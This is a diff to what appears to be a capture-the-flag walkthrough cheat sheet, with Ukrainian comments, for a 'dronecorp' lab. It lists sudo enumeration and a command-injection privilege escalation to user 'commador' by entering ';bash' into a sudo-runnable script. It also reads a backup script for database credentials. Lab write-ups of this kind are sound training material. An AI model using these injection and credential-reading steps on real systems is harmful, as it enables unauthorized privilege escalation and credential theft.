@@ -15,12 +15,12 @@ cat ~/flag.txt
 # Перевірити sudo права
 sudo -l
 
+# Знайти Flag_5 — читай вразливий скрипт (flag у docstring)
+cat /opt/dronecorp/tools/flight_log_export.py
+
 # Flag_5 — command injection (privesc до commador)
 sudo -u commador /opt/dronecorp/tools/flight_log_export.py
-# Ввести: ; /bin/bash ;
-
-# Перевірити Flag_5
-cat /home/commador/flag.txt
+# Ввести: ;bash
 
 # Знайти DB креди
 cat /home/commador/scripts/backup_db.sh
